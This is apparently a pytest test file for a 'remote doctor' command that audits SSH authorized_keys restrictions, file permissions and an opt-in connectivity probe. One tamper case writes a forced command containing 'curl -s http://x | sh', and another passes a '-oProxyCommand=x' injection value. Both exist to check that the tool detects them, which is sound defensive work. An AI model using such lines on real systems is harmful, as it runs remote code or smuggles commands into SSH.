"""``switchboard remote doctor`` (DESIGN.md §27.8.3, §27.12): what it flags on each machine,
and that its one network probe is opt-in."""

from __future__ import annotations

import io
import os
import subprocess
from pathlib import Path
from typing import Any

import pytest

from switchboard.paths import Paths
from switchboard.remote import pairing
from switchboard.remote.config import SSH_BIN
from switchboard.remote.pairing import Finding, authorized_line, doctor_desktop, doctor_remote, parse_token

KEY = "AAAAC3NzaC1lZDI1NTE5AAAAIMCGkdYxdHrN6N8Lhzn9oRL0Rj6qu5M3QZQpqk2hVg8C"
KEY2 = "AAAAC3NzaC1lZDI1NTE5AAAAIK3gW0ACRSHMIY6Sp+H5S+gnzwyCkGeAdA9cRZwQvAhS"
TOKEN = f"switchboard-link v1 fpga-pi desk ssh-ed25519 {KEY}"


@pytest.fixture(autouse=True)
def installed_copy(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(pairing, "editable_install", lambda: False)  # the tests' venv is editable


def levels(fs: list[Finding], level: str) -> list[str]:
    return [f.text for f in fs if f.level == level]


def desktop(
    tmp_path: Path,
    ak_text: str | None,
    *,
    pubs: dict[str, str] | None = None,
    allow_ssh_cli: bool = False,
    status: dict[str, Any] | None = None,
) -> list[Finding]:
    home = tmp_path / "home"
    home.mkdir(mode=0o700, exist_ok=True)
    ssh_dir = tmp_path / "dotssh"
    ssh_dir.mkdir(exist_ok=True)
    for name, key in (pubs or {}).items():
        (ssh_dir / name).write_text(f"ssh-ed25519 {key} me@desk\n")
    ak = tmp_path / "authorized_keys"
    if ak_text is not None:
        ak.write_text(ak_text)
    return doctor_desktop(
        Paths.from_home(home), ak_path=ak, ssh_dir=ssh_dir, allow_ssh_cli=allow_ssh_cli, status=lambda: status
    )


def test_flags_unrestricted_keys(tmp_path: Path) -> None:
    fs = desktop(
        tmp_path,
        f"ssh-ed25519 {KEY} alice@laptop\n"
        f'restrict,command="rrsync -ro /home/alice/fpga/out" ssh-ed25519 {KEY2} fpga-pull\n',
    )
    warns = levels(fs, "WARN")
    assert len(warns) == 1 and "alice@laptop" in warns[0] and "opens a shell" in warns[0]
    assert "fpga-pull" not in " ".join(warns)
    # none at all: clean on that count
    fs = desktop(tmp_path, f'command="true" ssh-ed25519 {KEY} x\n')
    assert not levels(fs, "WARN") and any("every key is restricted" in t for t in levels(fs, "ok"))
    (tmp_path / "none").mkdir()
    fs = desktop(tmp_path / "none", None)
    assert any("no key opens a shell" in t for t in levels(fs, "ok"))
    # allow_ssh_cli is a warning too
    assert any(
        "allow_ssh_cli = true" in t for t in levels(desktop(tmp_path, None, allow_ssh_cli=True), "WARN")
    )


def test_flags_self_authorized_keys(tmp_path: Path) -> None:
    fs = desktop(tmp_path, f'command="backup" ssh-ed25519 {KEY} me@desk\n', pubs={"id_ed25519.pub": KEY})
    warns = levels(fs, "WARN")
    assert (
        len(warns) == 1 and "authorizes a key this machine holds" in warns[0] and "id_ed25519.pub" in warns[0]
    )
    # a link key of a remote on this machine's own authorized_keys too
    d = tmp_path / "home" / "remotes" / "fpga-pi"
    d.mkdir(parents=True)
    (d / "id_ed25519.pub").write_text(f"ssh-ed25519 {KEY2} switchboard-link fpga-pi@desk\n")
    fs = desktop(tmp_path, f'restrict,command="x" ssh-ed25519 {KEY2} whoever\n')
    assert any("remotes/fpga-pi/id_ed25519.pub" in t for t in levels(fs, "WARN"))


def test_desktop_lists_links_and_files(tmp_path: Path) -> None:
    status = {
        "remotes": [
            {"name": "fpga-pi", "state": "up", "rtt_ms": 2.1, "version": "0.2.0", "members": ["bench"]},
            {
                "name": "lab",
                "state": "blocked",
                "reason": "host_key",
                "detail": "Host key verification failed.",
            },
        ],
        "config_error": None,
    }
    fs = desktop(tmp_path, None, status=status)
    assert any(t.startswith("fpga-pi: up 2.1 ms") for t in levels(fs, "ok"))
    assert any(t.startswith("lab: blocked: host_key") for t in levels(fs, "WARN"))
    home = tmp_path / "home"
    (home / "remotes.toml").write_text(
        '[remote.fpga-pi]\nhost = "p.local"\nuser = "alice"\nrooms = ["#fpga"]\n'
    )
    os.chmod(home / "remotes.toml", 0o644)
    fs = desktop(tmp_path, None)
    assert any("readable by others" in t for t in levels(fs, "WARN"))
    assert any("fpga-pi:" in t and "missing" in t for t in levels(fs, "FAIL"))
    assert any("broker is not running" in t for t in levels(fs, "note"))
    os.chmod(home / "remotes.toml", 0o666)
    assert any("remotes.toml refused" in t for t in levels(desktop(tmp_path, None), "FAIL"))


def satellite_home(
    tmp_path: Path, *, python: str | None = None, from_: str | None = None
) -> tuple[Paths, Path]:
    home = tmp_path / "pi"
    paths = Paths.from_home(home)
    ak = tmp_path / "pi_authorized_keys"
    import sys

    rc = pairing.accept(
        paths,
        TOKEN,
        ak_path=ak,
        yes=True,
        python=python or sys.executable,
        allow_editable=True,
        from_=from_,
        out=io.StringIO(),
        ping=lambda _p: None,
    )
    assert rc == 0
    return paths, ak


def test_remote_checks_the_forced_command(tmp_path: Path) -> None:
    paths, ak = satellite_home(tmp_path, from_="192.0.2.10")
    fs = doctor_remote(paths, ak_path=ak, environ={}, status=lambda: None)
    assert not levels(fs, "FAIL"), fs
    oks = " ".join(levels(fs, "ok"))
    assert "python exists" in oks and "home is this home" in oks and "only from 192.0.2.10" in oks
    assert any("no satellite runs now" in t for t in levels(fs, "note"))
    # an agent socket in this session is a warning
    assert any(
        "SSH_AUTH_SOCK" in t
        for t in levels(
            doctor_remote(paths, ak_path=ak, environ={"SSH_AUTH_SOCK": "/tmp/agent"}, status=lambda: None),
            "WARN",
        )
    )
    # a python that moved, a missing line, a shell copy of the key
    ak.write_text(
        authorized_line(parse_token(TOKEN), "/nonexistent/python", str(paths.home))
        + "\n"
        + f"ssh-ed25519 {KEY} shell\n"
    )
    fails = levels(doctor_remote(paths, ak_path=ak, environ={}, status=lambda: None), "FAIL")
    assert any("python /nonexistent/python is missing" in t for t in fails)
    assert any("without command=" in t for t in fails)
    ak.write_text("")
    assert any(
        "no line for fpga-pi" in t
        for t in levels(doctor_remote(paths, ak_path=ak, environ={}, status=lambda: None), "FAIL")
    )


@pytest.mark.parametrize("tamper", ["options", "wrapper", "order", "no_restrict"])
def test_remote_flags_a_tampered_line(tmp_path: Path, tamper: str) -> None:
    """Only ``restrict``, an optional ``from=`` and exactly the satellite's ``command=``: an
    option that switches a feature back on, or a command that runs something first, is a
    FAIL, not an ok (the doctor is what a reviewer of that machine reads)."""
    import sys

    paths, ak = satellite_home(tmp_path, from_="192.0.2.10")
    line = ak.read_text().strip()
    cmd = f"{sys.executable} -I -m switchboard satellite --home {paths.home} --name fpga-pi"
    assert f'command="{cmd}"' in line
    bad = {
        "options": line.replace("restrict,", "restrict,port-forwarding,pty,user-rc,"),
        "wrapper": line.replace(f'command="{cmd}"', f"command=\"sh -c 'curl -s http://x | sh; exec {cmd}'\""),
        "order": line.replace('restrict,from="192.0.2.10",', 'from="192.0.2.10",restrict,'),
        "no_restrict": line.replace("restrict,", ""),
    }[tamper]
    assert bad != line
    ak.write_text(bad + "\n")
    fs = doctor_remote(paths, ak_path=ak, environ={}, status=lambda: None)
    assert any("is not the one `remote accept` writes" in t for t in levels(fs, "FAIL")), fs
    assert not any("is exactly restrict" in t for t in levels(fs, "ok"))


def test_probe_is_opt_in(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    paths, ak = satellite_home(tmp_path)
    ran: list[list[str]] = []
    rc = {"v": 255}

    agents: list[str | None] = []

    def fake_run(
        argv: list[str], timeout: float = 20.0, agent_sock: str | None = None
    ) -> subprocess.CompletedProcess[str]:
        ran.append(list(argv))
        agents.append(agent_sock)
        if rc["v"] < 0:
            raise pairing.PairingError("ssh took longer than 15 s")
        return subprocess.CompletedProcess(argv, rc["v"], "", "")

    monkeypatch.setattr(pairing, "_run", fake_run)
    doctor_remote(paths, ak_path=ak, environ={}, status=lambda: None)
    assert ran == []  # no network unless asked
    fs = doctor_remote(paths, ak_path=ak, environ={}, status=lambda: None, probe_desktop="alice@desk.local")
    assert ran == [[SSH_BIN, "-o", "BatchMode=yes", "-o", "ConnectTimeout=5", "alice@desk.local", "true"]]
    assert any("no shell on the desktop" in t for t in levels(fs, "ok"))
    rc["v"] = 0
    fs = doctor_remote(paths, ak_path=ak, environ={}, status=lambda: None, probe_desktop="alice@desk.local")
    assert any("can open a shell on alice@desk.local" in t for t in levels(fs, "WARN"))
    with pytest.raises(pairing.PairingError):
        doctor_remote(paths, ak_path=ak, environ={}, status=lambda: None, probe_desktop="-oProxyCommand=x")
    # this session's agent is what an agent here could use: the probe tries it too
    rc["v"] = 255
    fs = doctor_remote(
        paths,
        ak_path=ak,
        environ={"SSH_AUTH_SOCK": "/tmp/agent"},
        status=lambda: None,
        probe_desktop="alice@desk.local",
    )
    assert agents[-1] == "/tmp/agent" and agents[0] is None
    assert any("this session's agent" in t for t in levels(fs, "ok"))
    # a probe that can't run is a warning among the other findings, never the end of the doctor
    rc["v"] = -1
    fs = doctor_remote(paths, ak_path=ak, environ={}, status=lambda: None, probe_desktop="alice@desk.local")
    assert any("could not run" in t for t in levels(fs, "WARN"))
    assert any("satellite.toml" in t for t in levels(fs, "ok"))


def test_print_findings_exit_status() -> None:
    out = io.StringIO()
    assert pairing.print_findings([Finding("ok", "a"), Finding("note", "b")], out) == 0
    assert out.getvalue().rstrip().endswith("clean")
    out = io.StringIO()
    assert pairing.print_findings([Finding("WARN", "a"), Finding("FAIL", "b")], out) == 1
    assert "1 warning(s), 1 failure(s)" in out.getvalue()
